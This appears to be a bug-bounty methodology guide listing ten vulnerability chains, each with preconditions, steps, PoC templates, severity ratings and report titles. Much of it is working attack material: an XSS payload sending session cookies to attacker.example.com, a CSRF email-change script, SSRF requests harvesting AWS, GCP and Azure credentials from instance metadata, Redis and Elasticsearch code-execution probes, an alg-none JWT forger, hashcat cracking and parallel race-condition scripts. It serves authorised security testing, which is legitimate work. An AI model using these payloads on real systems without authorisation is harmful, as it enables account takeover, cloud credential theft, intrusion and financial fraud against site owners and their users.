# Vulnerability Chain Patterns

Known vulnerability chains that escalate individual findings to higher-impact composite attacks. For each chain: preconditions, step-by-step exploitation, PoC template, expected severity, and what to report.

**Core principle:** Always attempt chaining before finalizing severity. A P4 finding alone might be noise -- chained with another finding, it becomes a P1 submission worth $10K+.

---

## Chain 1: XSS to Session Theft to Account Takeover

**Preconditions:**
- Stored or reflected XSS on an authenticated page
- Session cookies WITHOUT the HttpOnly flag
- No Content Security Policy (CSP) blocking inline scripts or external connections

**Steps:**
1. Identify the XSS injection point (stored preferred -- reflected requires user interaction)
2. Craft payload to exfiltrate session cookies to attacker-controlled server
3. Inject the payload into the vulnerable parameter
4. When victim views the page, JavaScript runs in their browser context
5. Victim's session cookie is sent to the attacker's collection server
6. Attacker replays the stolen cookie to impersonate the victim

**PoC Template:**
```
Payload to inject:
<script>var i=new Image();i.src="https://attacker.example.com/collect?c="+encodeURIComponent(document.cookie);</script>

Verification -- check attacker server logs for incoming cookie, then replay:
curl -s https://target.com/api/me -H "Cookie: session=STOLEN_SESSION_VALUE" | jq '.email, .role'
```

**If HttpOnly blocks cookie theft:** Pivot to Chain 2 (XSS to CSRF to ATO).

**Severity:** P1 (Critical) -- Full account takeover of any user who views the page
**Report as:** "Stored XSS in [component] leads to account takeover via session theft"

---

## Chain 2: XSS to CSRF Token Theft to Account Takeover

**Preconditions:**
- Stored or reflected XSS on an authenticated page
- Cookies ARE HttpOnly (cannot steal directly)
- Application uses CSRF tokens for state-changing requests
- Email change or password change endpoint exists

**Steps:**
1. XSS payload reads the CSRF token from the page (meta tag, hidden field, or DOM)
2. XSS payload submits a request to change the victim's email to attacker's email
3. CSRF token is included in the forged request -- server accepts it
4. Attacker receives confirmation email at their address
5. Attacker triggers password reset flow to the new (attacker-controlled) email
6. Attacker logs in as the victim with the new password

**PoC Template:**
```
Payload:
<script>
var csrf = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
var xhr = new XMLHttpRequest();
xhr.open('POST', '/api/account/email', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.setRequestHeader('X-CSRF-Token', csrf);
xhr.withCredentials = true;
xhr.send(JSON.stringify({email: 'attacker@evil.com'}));
xhr.onload = function() {
  new Image().src = 'https://attacker.example.com/notify?status=' + xhr.status;
};
</script>

After email change, trigger password reset:
curl -s -X POST https://target.com/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com"}'
```

**Severity:** P1 (Critical) -- Full account takeover even with HttpOnly cookies
**Report as:** "Stored XSS in [component] chains to account takeover via CSRF email change"

---

## Chain 3: SSRF to Cloud Metadata to Credential Theft

**Preconditions:**
- Server-Side Request Forgery (SSRF) endpoint discovered
- Application runs on AWS (EC2), GCP (Compute Engine), or Azure (VM)
- Instance Metadata Service (IMDS) is accessible (IMDSv1 or bypassed IMDSv2)
- No SSRF URL filtering blocks the 169.254.169.254 range

**Steps:**
1. Confirm SSRF by requesting an external URL you control -- verify callback
2. Request the cloud metadata endpoint through the SSRF
3. For AWS: enumerate IAM role name from metadata
4. Request temporary credentials for that IAM role
5. Use extracted AWS credentials to access S3, DynamoDB, Secrets Manager, etc.
6. Document which services are accessible and what data is exposed

**PoC Template:**
```
Step 1 -- Confirm SSRF:
curl -s "https://target.com/api/fetch?url=https://attacker.example.com/ssrf-test"

Step 2 -- AWS metadata -- get IAM role name:
curl -s "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

Step 3 -- Get credentials for that role:
curl -s "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-app-role"
Expected response: {"AccessKeyId": "AKIA...", "SecretAccessKey": "...", "Token": "..."}

Step 4 -- Use stolen credentials:
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws s3 ls
aws sts get-caller-identity
aws secretsmanager list-secrets

GCP variant:
curl -s "https://target.com/api/fetch?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"

Azure variant:
curl -s "https://target.com/api/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  -H "Metadata: true"
```

**Severity:** P1 (Critical) -- Full cloud infrastructure access
**Report as:** "SSRF in [endpoint] allows AWS credential theft via IMDS leading to [specific service] access"

---

## Chain 4: SSRF to Internal Service to Remote Code Execution

**Preconditions:**
- SSRF endpoint discovered
- Internal services running on non-public ports (8080, 8443, 9200, 6379, etc.)
- Internal service has admin panel, API, or exploitable interface
- Internal service does not require authentication (common for internal-only services)

**Steps:**
1. Confirm SSRF connectivity to internal networks (try 127.0.0.1, 10.0.0.0/8, 172.16.0.0/12)
2. Port scan internal hosts through the SSRF (try common ports: 80, 443, 8080, 8443, 9200, 6379, 27017)
3. Identify internal services by their response patterns
4. Exploit the internal service (admin panel file upload, Redis command injection, Elasticsearch RCE, etc.)
5. Achieve code execution on the internal host

**PoC Template:**
```
Step 1 -- Probe internal network:
curl -s "https://target.com/api/fetch?url=http://127.0.0.1:8080/"

Step 2 -- Enumerate internal admin endpoints:
curl -s "https://target.com/api/fetch?url=http://127.0.0.1:8080/admin/upload"

Step 3a -- If Redis on 6379:
curl -s "https://target.com/api/fetch?url=http://127.0.0.1:6379/SET%20shell%20%22payload%22"

Step 3b -- If Elasticsearch on 9200:
curl -s "https://target.com/api/fetch?url=http://127.0.0.1:9200/_search" \
  --data '{"script_fields":{"exp":{"script":"java.lang.Runtime.getRuntime().exec(\"id\")"}}}'

Step 3c -- If internal admin with file upload:
Use SSRF to POST a web shell to the admin upload endpoint
```

**Severity:** P1 (Critical) -- Remote code execution on internal infrastructure
**Report as:** "SSRF in [endpoint] provides access to internal [service] leading to RCE"

---

## Chain 5: IDOR to Data Exfiltration to Privilege Escalation

**Preconditions:**
- Insecure Direct Object Reference (IDOR) on a user data endpoint
- Endpoint returns user details including role, API keys, or tokens
- Sequential or predictable user/object IDs
- Admin users exist in the same ID space

**Steps:**
1. Confirm IDOR by accessing another user's data with your session
2. Enumerate user IDs (sequential increment, or based on discovered patterns)
3. Extract data for multiple users -- focus on fields like role, api_key, auth_token
4. Identify admin users by role field or elevated permissions
5. Use admin credentials (API key, token) to access admin-level endpoints
6. Document the full escalation path from regular user to admin access

**PoC Template:**
```
Step 1 -- Access own profile (authorized):
curl -s https://target.com/api/users/1001 \
  -H "Authorization: Bearer YOUR_TOKEN" | jq .

Step 2 -- Access another user's profile (IDOR):
curl -s https://target.com/api/users/1002 \
  -H "Authorization: Bearer YOUR_TOKEN" | jq .

Step 3 -- Enumerate to find admin users:
for id in $(seq 1 100); do
  role=$(curl -s https://target.com/api/users/$id \
    -H "Authorization: Bearer YOUR_TOKEN" | jq -r '.role')
  echo "User $id: $role"
done

Step 4 -- Extract admin API key:
curl -s https://target.com/api/users/1 \
  -H "Authorization: Bearer YOUR_TOKEN" | jq '.api_key'

Step 5 -- Use admin API key for privilege escalation:
curl -s https://target.com/api/admin/users \
  -H "Authorization: Bearer admin-api-key-xxx" | jq .
```

**Severity:** P1 (Critical) -- Privilege escalation from regular user to admin
**Report as:** "IDOR in /api/users/{id} exposes admin API keys leading to full privilege escalation"

---

## Chain 6: Open Redirect to OAuth Token Theft to Account Takeover

**Preconditions:**
- Open redirect on a domain that is whitelisted as an OAuth redirect_uri
- Application uses OAuth 2.0 (Authorization Code or Implicit flow)
- OAuth provider validates redirect_uri by prefix or domain (not exact match)
- Alternatively: redirect_uri validation is bypassable via URL parsing tricks

**Steps:**
1. Find open redirect on the application's domain (e.g., /redirect?url=https://evil.com)
2. Craft an OAuth authorization URL that uses the open redirect as redirect_uri
3. Victim clicks the crafted link, authenticates with OAuth provider
4. OAuth provider redirects to the open redirect with auth code/token in URL
5. Open redirect sends victim to attacker's server with the auth code/token
6. Attacker exchanges the auth code for an access token -- account takeover

**PoC Template:**
```
Step 1 -- Confirm open redirect:
curl -s -o /dev/null -w "%{redirect_url}" \
  "https://target.com/redirect?url=https://attacker.example.com"

Step 2 -- Craft OAuth URL with open redirect as redirect_uri:
https://accounts.google.com/o/oauth2/auth?client_id=TARGET_CLIENT_ID&redirect_uri=https://target.com/redirect?url=https://attacker.example.com/steal&response_type=code&scope=openid+email+profile

Step 3 -- Victim clicks, authenticates, redirected to:
https://attacker.example.com/steal?code=AUTH_CODE_HERE

Step 4 -- Exchange stolen auth code for access token:
curl -s -X POST https://oauth2.googleapis.com/token \
  -d "code=STOLEN_AUTH_CODE" \
  -d "client_id=TARGET_CLIENT_ID" \
  -d "client_secret=TARGET_CLIENT_SECRET" \
  -d "redirect_uri=https://target.com/redirect?url=https://attacker.example.com/steal" \
  -d "grant_type=authorization_code"

Common redirect_uri bypass techniques:
- https://target.com/redirect?url=https://evil.com
- https://target.com/callback/../redirect?url=https://evil.com
- https://target.com/callback?next=https://evil.com
- https://target.com/callback#@evil.com
```

**Severity:** P1 (Critical) -- Account takeover via OAuth flow hijacking
**Report as:** "Open redirect on [domain] enables OAuth token theft leading to account takeover"

---

## Chain 7: Information Disclosure to API Key to Data Breach

**Preconditions:**
- API key, secret, or token leaked via: JavaScript source files, error messages, git repositories, .env files, debug endpoints, client-side storage
- The leaked credential provides access to a backend service, third-party API, or internal system

**Steps:**
1. Discover the leaked credential (source view, JS files, error responses, .git exposure)
2. Identify what service/API the credential belongs to (naming patterns, format, header usage)
3. Determine the credential's scope -- what can it access?
4. Use the credential to access the protected service
5. Document what data/actions are accessible
6. Assess the full impact (number of records, data sensitivity, actions possible)

**PoC Template:**
```
Step 1 -- Find leaked key in JavaScript bundle:
curl -s https://target.com/static/js/app.bundle.js | grep -oP '(api[_-]?key|secret|token)\s*[=:]\s*["\x27][^"\x27]+'

Step 2a -- If AWS key found:
export AWS_ACCESS_KEY_ID="AKIA..."
export AWS_SECRET_ACCESS_KEY="..."
aws sts get-caller-identity
aws s3 ls
aws dynamodb list-tables

Step 2b -- If Stripe key found:
curl -s https://api.stripe.com/v1/customers?limit=5 -u sk_live_LEAKED_KEY:

Step 2c -- If SendGrid key found:
curl -s https://api.sendgrid.com/v3/marketing/contacts \
  -H "Authorization: Bearer SG.LEAKED_KEY"

Step 2d -- If internal API key found:
curl -s https://target.com/api/admin/users \
  -H "X-API-Key: LEAKED_KEY" | jq '. | length'
```

**Severity:** P2-P1 depending on key scope
- P1: Cloud credentials (AWS/GCP/Azure), payment processor keys (Stripe live), admin API keys
- P2: Third-party service keys with PII access (SendGrid, Twilio), internal API keys with limited scope
- P3: Keys with read-only access to non-sensitive data

**Report as:** "Leaked [service] API key in [location] provides access to [N records/specific data]"

---

## Chain 8: Race Condition to Financial Impact

**Preconditions:**
- Financial operation exists (money transfer, coupon redemption, purchase, reward claim, referral bonus)
- Operation lacks idempotency controls (no dedup key, no mutex/lock, no optimistic locking)
- Operation can be triggered via API (not just UI with CAPTCHA)

**Steps:**
1. Identify the financial endpoint and its parameters
2. Prepare N identical requests (10-50 typically)
3. Send all requests simultaneously (true parallelism, not sequential)
4. Check if the operation ran multiple times
5. Calculate the financial impact (N times the operation value)

**PoC Template:**
```
Method 1 -- GNU parallel:
seq 1 20 | parallel -j20 'curl -s -X POST https://target.com/api/redeem \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"coupon_code\": \"SAVE50\"}" \
  -o /dev/null -w "Attempt {}: %{http_code}\n"'

Verify -- check account balance or coupon usage count:
curl -s https://target.com/api/account/balance \
  -H "Authorization: Bearer TOKEN" | jq '.balance'

Verify coupon applied multiple times:
curl -s https://target.com/api/orders?status=completed \
  -H "Authorization: Bearer TOKEN" | jq '.[].discount'
```

**Severity:** P1 (Critical) with financial impact -- direct monetary loss to company
**Report as:** "Race condition in [endpoint] allows [N]x [operation] resulting in $[amount] financial impact"

---

## Chain 9: JWT Misconfiguration to Authentication Bypass to Admin Access

**Preconditions:**
- Application uses JWT for authentication
- JWT has one of: algorithm confusion (RS256 to HS256), none algorithm accepted, weak secret, missing signature verification, or kid injection

**Steps:**
1. Decode the JWT (header + payload) -- identify algorithm and claims
2. Identify the misconfiguration (alg: none, weak secret, algorithm confusion)
3. Craft a modified JWT exploiting the misconfiguration
4. Use the forged JWT to access protected resources
5. Escalate by modifying claims (role: admin, user_id: 1, is_admin: true)

**PoC Template:**
```
Step 1 -- Decode existing JWT:
echo "eyJhbG..." | cut -d. -f1 | base64 -d 2>/dev/null | jq .
echo "eyJhbG..." | cut -d. -f2 | base64 -d 2>/dev/null | jq .

Step 2a -- Algorithm "none" attack (Python):
import base64, json
header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=")
payload = base64.urlsafe_b64encode(json.dumps({"user_id":1,"role":"admin","exp":9999999999}).encode()).rstrip(b"=")
print(f"{header.decode()}.{payload.decode()}.")

Step 2b -- Weak secret brute force:
hashcat -a 0 -m 16500 "JWT_TOKEN_HERE" /usr/share/wordlists/rockyou.txt

Step 3 -- Use forged JWT:
curl -s https://target.com/api/admin/dashboard \
  -H "Authorization: Bearer FORGED_JWT_HERE" | jq .
```

**Severity:** P1 (Critical) -- Authentication bypass to admin access
**Report as:** "JWT [algorithm none/weak secret/algorithm confusion] allows authentication bypass and admin access"

---

## Chain 10: Subdomain Takeover to Phishing to Session/Cookie Theft

**Preconditions:**
- Subdomain points to a decommissioned external service (CNAME dangling)
- Subdomain is on the same parent domain as the main application
- Application sets cookies on the parent domain (e.g., .target.com)
- OR: subdomain is trusted in CSP, CORS, or OAuth redirect_uri

**Steps:**
1. Identify dangling CNAME (subdomain pointing to unclaimed external service)
2. Claim the external service resource (S3 bucket, Heroku app, GitHub Pages, etc.)
3. Deploy content on the taken-over subdomain
4. Exploit the trust relationship:
   a. Read cookies set on parent domain (if not properly scoped)
   b. Host convincing phishing page (trusted subdomain in URL bar)
   c. Abuse CORS trust to make cross-origin requests to main app
   d. Use as OAuth redirect_uri if whitelisted

**PoC Template:**
```
Step 1 -- Identify dangling CNAME:
dig old-app.target.com CNAME
Response: old-app.target.com CNAME old-app.herokuapp.com
Verify the Heroku app is unclaimed (404 or "no such app" error)

Step 2 -- Claim the resource:
heroku create old-app

Step 3 -- Deploy cookie-stealing page on the subdomain

Step 4 -- If CORS trust exists, steal data from main app via cross-origin fetch
```

**Severity:** P2-P1 depending on trust relationship
- P1: Can steal session cookies or abuse OAuth/CORS trust for account takeover
- P2: Confirmed takeover with phishing potential but no direct cookie/token theft

**Report as:** "Subdomain takeover on [subdomain] via dangling CNAME enables [cookie theft/phishing/CORS abuse]"

---

## Chain Detection Algorithm

When validating findings, run this check against all validated findings:

```
FOR each finding F in validated_findings:
  FOR each chain C in chain_patterns:
    IF F.type matches C.entry_point:
      Check if preconditions are met
      Check if we have the other findings needed for the chain
      Attempt to walk the full chain
      IF result.success:
        MERGE findings into chain finding
        SET chain_severity = C.terminal_severity
        MARK individual findings as "chained"
```

**Priority order for chain checking:**
1. XSS findings -- check ATO chains (Chain 1, 2)
2. SSRF findings -- check cloud/internal chains (Chain 3, 4)
3. IDOR findings -- check escalation chains (Chain 5)
4. Open redirect -- check OAuth chains (Chain 6)
5. Info disclosure -- check key abuse chains (Chain 7)
6. Race conditions -- check financial chains (Chain 8)
7. JWT issues -- check auth bypass chains (Chain 9)
8. Subdomain takeover -- check trust abuse chains (Chain 10)
